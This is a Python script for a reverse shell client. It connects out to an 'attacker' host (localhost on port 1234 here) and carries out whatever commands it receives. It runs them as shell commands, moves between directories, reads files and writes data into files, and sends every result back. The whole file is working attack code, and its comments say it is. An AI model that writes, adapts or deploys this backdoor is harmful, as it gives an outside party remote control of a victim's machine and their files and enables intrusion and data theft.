import socket
import subprocess
import os

BUFFER_SIZE = 1024
target_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connects with the attacker 
def target_client_connector():
    # connect to the attacker
    attacker_hostname = "localhost"
    attacker_port = 1234
    while(True):
        success = target_client.connect_ex((attacker_hostname, attacker_port))
        if(not success):
            # connection established successfully
            break

def send_data(data):
    # receive data from the attacker server
    target_client.send(bytes(data, 'utf-8'))

def receive_data():
    # receive data from the attacker server
    response = ""
    while True:
        received_data = target_client.recv(BUFFER_SIZE)
        received_data = received_data.decode('utf-8')
        response = response + str(received_data)
        if(len(received_data) < BUFFER_SIZE):
            break
    print("Received: " + response)
    # acknowledge receiving the data
    send_data("ACK")

    # do something on the data
    
    output = run_command(response)
    if(type(output) is not str):
        output = output.decode('utf-8')
    # send result back
    send_data("Result: " + output)

def navigate_directory(command):
    destination_directory_path = command[command.index("cd") + 3:]
    print(destination_directory_path)
    os.chdir(destination_directory_path)

#   commands of the form:
#   file    name_of_file   r/w/rw/a 
#   do NOT create a file if it does not previously exist
def file_handler(command):
    command_splits = command.split(" ")
    if(len(command_splits) > 3):
        return "file command has more than two arguments."
    
    elif(command_splits[0] != 'file'):
        return "incorrect command"
    
    file_name = command_splits[1]
    mode = command_splits[2]

    try:
        file_object = open(file_name, mode)
    except Exception as e:
        return str(e)
    

    if(mode == 'r'):
        data_read = file_object.read()
        file_object.close()
        return data_read
    
    elif(mode == 'w' or mode == 'a'):
        response = ""
        while True:
            received_data = target_client.recv(BUFFER_SIZE)
            received_data = received_data.decode('utf-8')
            if(received_data == "FILE_UPDATE_QUIT"):
                break
            response = response + str(received_data) + "\n"
        file_object.write(response)
        file_object.close()
        return "Data written successfully"

def run_command(command):

    command = command.rstrip()

    try:
        command.index("cd")
        navigate_directory(command)
        return "Directory changed to: " + str(os.getcwd())
    except:
        pass

    try:
        command.index("file")
        output = file_handler(command)
        return output
    except:
        pass
    
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = "Failed to execute command " + str(e)
    return output

def main():
    # connect to the attacker
    target_client_connector()
    while True:
        receive_data()

main()